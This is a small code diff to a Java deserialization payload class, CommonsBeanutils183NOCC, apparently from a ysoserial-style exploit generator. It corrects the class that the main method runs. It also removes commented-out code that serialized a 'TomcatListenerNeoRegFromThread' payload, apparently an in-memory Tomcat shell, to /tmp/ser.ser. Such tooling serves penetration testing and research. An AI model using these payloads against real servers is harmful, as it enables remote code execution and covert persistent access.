@@ -20,12 +20,7 @@ import java.util.PriorityQueue;
 @Authors({Authors.Y4ER})
 public class CommonsBeanutils183NOCC implements ObjectPayload<Object> {
     public static void main(String[] args) throws Exception {
-        PayloadRunner.run(CommonsBeanutils192NOCC.class, args);
-
-//        Object object = new CommonsBeanutils183NOCC().getObject("CLASS:TomcatListenerNeoRegFromThread");
-//        File file = new File("/tmp/ser.ser");
-//        if (file.exists()) file.delete();
-//        Serializer.serialize(object, new FileOutputStream(file));
+        PayloadRunner.run(CommonsBeanutils183NOCC.class, args);
     }
 
     @Override
